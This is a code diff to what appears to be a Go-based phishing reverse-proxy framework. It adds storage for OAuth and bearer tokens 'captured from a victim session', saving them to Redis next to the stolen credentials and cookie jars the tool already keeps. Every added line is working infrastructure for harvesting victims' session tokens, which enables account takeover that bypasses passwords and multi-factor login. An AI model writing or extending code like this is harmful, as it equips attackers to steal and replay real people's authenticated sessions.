@@ -20,11 +20,13 @@ type Victim struct {
 	LastSeen            string `redis:"lseen"`
 	RequestCount        int    `redis:"reqCount"`
 	CredsCount          int    `redis:"creds_count"`
+	TokenCount          int    `redis:"token_count"`
 	CookieJar           string `redis:"cookiejar_id"`
 	SessionInstrumented bool   `redis:"session_instrumented"`
 
 	Cookies     []VictimCookie     `redis:"-"`
 	Credentials []VictimCredential `redis:"-"`
+	Tokens      []VictimToken      `redis:"-"`
 }
 
 // VictimCredential: a victim has at least one set of credentials
@@ -36,7 +38,14 @@ type VictimCredential struct {
 	Time  string `redis:"time"`
 }
 
-// VictimCookie a victim has N cookies associated with its web session
+// VictimToken: an OAuth / bearer token captured from a victim session
+// KEY scheme:
+// victim:<ID>:tokens:<COUNT>
+type VictimToken struct {
+	Type  string `redis:"type"  json:"type"`  // e.g. access_token, refresh_token, id_token, bearer
+	Value string `redis:"value" json:"value"`
+	Time  string `redis:"time"  json:"time"`
+}
 // KEY scheme:
 // victim:<ID>:cookiejar:<COOKIE_NAME>
 type VictimCookie struct {
@@ -98,6 +107,31 @@ func (vc *VictimCredential) Store(victimID string) error {
 
 	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(increment)...); err != nil {
 		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
+		return err
+	}
+
+	return nil
+}
+
+// Store saves a VictimToken in the database
+func (vt *VictimToken) Store(victimID string) error {
+	rc := session.RedisPool.Get()
+	defer rc.Close()
+
+	v, err := GetVictim(victimID)
+	if err != nil {
+		return err
+	}
+
+	key := fmt.Sprintf("victim:%s:tokens:%d", victimID, v.TokenCount)
+	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vt)...); err != nil {
+		log.Error("error doing redis HMSET: %s. victim token not saved.", err)
+		return err
+	}
+
+	key = fmt.Sprintf("victim:%s", victimID)
+	if _, err := rc.Do("HSET", key, "token_count", v.TokenCount+1); err != nil {
+		log.Error("error doing redis HSET: %s. token_count not updated.", err)
 		return err
 	}
 
@@ -169,7 +203,43 @@ func GetVictim(victimID string) (*Victim, error) {
 		return nil, err
 	}
 
+	// Populate Tokens
+	err = v.GetTokens()
+	if err != nil {
+		return nil, err
+	}
+
 	return &v, nil
+}
+
+// GetTokens populates Victim.Tokens from Redis
+func (v *Victim) GetTokens() error {
+	rc := session.RedisPool.Get()
+	defer rc.Close()
+
+	v.Tokens = []VictimToken{}
+	tKeys, err := redis.Values(rc.Do("KEYS", fmt.Sprintf("victim:%s:tokens:*", v.ID)))
+	if err != nil {
+		return err
+	}
+
+	for _, k := range tKeys {
+		raw, err := redis.Values(rc.Do("HGETALL", k))
+		if err != nil {
+			log.Error("%v", err)
+			continue
+		}
+
+		var vt VictimToken
+		if err = redis.ScanStruct(raw, &vt); err != nil {
+			log.Error("%v", err)
+			continue
+		}
+
+		v.Tokens = append(v.Tokens, vt)
+	}
+
+	return nil
 }
 
 // GetCredentials returns a VictimCredential from database
